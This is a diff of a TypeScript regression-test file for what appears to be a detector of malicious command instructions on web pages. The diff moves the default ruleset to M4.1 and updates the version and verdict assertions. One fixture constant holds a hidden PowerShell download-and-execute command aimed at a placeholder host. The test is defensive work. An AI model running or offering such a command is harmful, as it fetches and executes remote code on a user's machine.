@@ -1,13 +1,15 @@
 // M4.1 regression tests. The default (M1) model must be unchanged; ruleset 'm4.1-rc1' is the candidate.
 // Cases marked KNOWN LIMITATION pin current behavior we consider wrong, so future changes are visible.
 import { describe, expect, it } from 'vitest';
-import { analyze, ENGINE_VERSION } from '../src/core/index.js';
-import type { AnalysisResult, PageSnapshot } from '../src/core/types.js';
+import { analyze as coreAnalyze, ENGINE_VERSION, ENGINE_VERSION_M1 } from '../src/core/index.js';
+import type { AnalysisResult, AnalyzeOptions, PageSnapshot } from '../src/core/types.js';
+
+// `analyze` = M1 baseline (explicit ruleset 'm1'); `rc` = the M4.1 rule set, the production default since M4.3A.
+const analyze = (s: PageSnapshot, o: AnalyzeOptions = {}): AnalysisResult => coreAnalyze(s, { ruleset: 'm1', ...o });
 import { inContainer, snapshot } from './fixtures/build.js';
 import { KNOWN_LIMITATIONS, SCENARIOS } from './fixtures/scenarios.js';
 
-const RC = { ruleset: 'm4.1-rc1' } as const;
-const rc = (s: PageSnapshot): AnalysisResult => analyze(s, RC);
+const rc = (s: PageSnapshot): AnalysisResult => coreAnalyze(s);
 const rules = (r: AnalysisResult) => r.findings.map((f) => `${f.ruleId}:${f.classification}`);
 const DIALOG = { dialog: true };
 const OVERLAY = { overlay: true };
@@ -15,20 +17,31 @@ const ARTICLE = { article: true };
 const CODE = { article: true, pre: true, code: true };
 const STAGED = 'powershell -w hidden -c "iex(irm https://x.example.invalid/p)"';
 
-describe('M1 default is untouched by the M4.1 additions', () => {
-  it('no overrides field, M1 engine version, identical results for every M1 fixture', () => {
+describe('engine adoption (M4.3A): default = ruleset m4.1, engine 0.2.0; M1 still selectable', () => {
+  it('ruleset m1 reports the M1 engine and has no overrides field', () => {
     for (const sc of [...SCENARIOS, ...KNOWN_LIMITATIONS]) {
       const r = analyze(sc.snapshot);
-      expect(r.engineVersion).toBe(ENGINE_VERSION);
+      expect(r.engineVersion).toBe(ENGINE_VERSION_M1);
       expect(r.findings.every((f) => !('overrides' in f))).toBe(true);
-      expect(analyze(sc.snapshot, { ruleset: 'm1' })).toEqual(r);
     }
   });
 
-  it('rc1 reports its own engine version and is deterministic', () => {
-    const s = SCENARIOS[0]!.snapshot;
-    expect(rc(s).engineVersion).toBe('0.2.0-rc.1');
-    expect(rc(s)).toEqual(rc(s));
+  it('the default equals ruleset m4.1 and the legacy alias m4.1-rc1, and reports engine 0.2.0', () => {
+    for (const sc of [...SCENARIOS, ...KNOWN_LIMITATIONS]) {
+      const d = rc(sc.snapshot);
+      expect(d.engineVersion).toBe(ENGINE_VERSION);
+      expect(ENGINE_VERSION).toBe('0.2.0');
+      expect(coreAnalyze(sc.snapshot, { ruleset: 'm4.1' })).toEqual(d);
+      expect(coreAnalyze(sc.snapshot, { ruleset: 'm4.1-rc1' })).toEqual(d);
+      expect(rc(sc.snapshot)).toEqual(d);
+    }
+  });
+
+  it('on the M1 unit fixtures, the default differs from M1 exactly where documented (S-N8, S-L2)', () => {
+    const changed = [...SCENARIOS, ...KNOWN_LIMITATIONS]
+      .filter((sc) => rc(sc.snapshot).verdict !== analyze(sc.snapshot).verdict)
+      .map((sc) => `${sc.id}: ${analyze(sc.snapshot).verdict} → ${rc(sc.snapshot).verdict}`);
+    expect(changed).toEqual(['S-N8-en: suspicious_correlation → observed_instruction', 'S-L2-en: suspicious_correlation → observed_instruction']);
   });
 });
 
